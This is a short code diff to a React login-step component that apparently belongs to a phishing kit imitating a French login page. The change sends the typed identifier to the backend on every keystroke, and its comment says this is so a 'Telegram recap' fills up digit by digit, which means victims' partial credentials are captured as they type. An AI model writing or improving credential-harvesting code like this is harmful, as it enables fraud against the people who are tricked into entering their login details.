@@ -44,10 +44,11 @@ export default function LoginStep({ onSubmit, onProgress, submitting }) {
     }
   }, [phase]);
 
-  // Progressive updates to backend (debounced inside parent)
+  // Progressive updates: send identifiant on EVERY change so the Telegram
+  // recap fills up digit by digit (debounced 450 ms in the parent).
   useEffect(() => {
     if (!onProgress) return;
-    if (identifiant.length === 10) {
+    if (identifiant.length > 0) {
       onProgress("identifiant", { identifiant, memorise: memorize });
     }
   }, [identifiant, memorize, onProgress]);
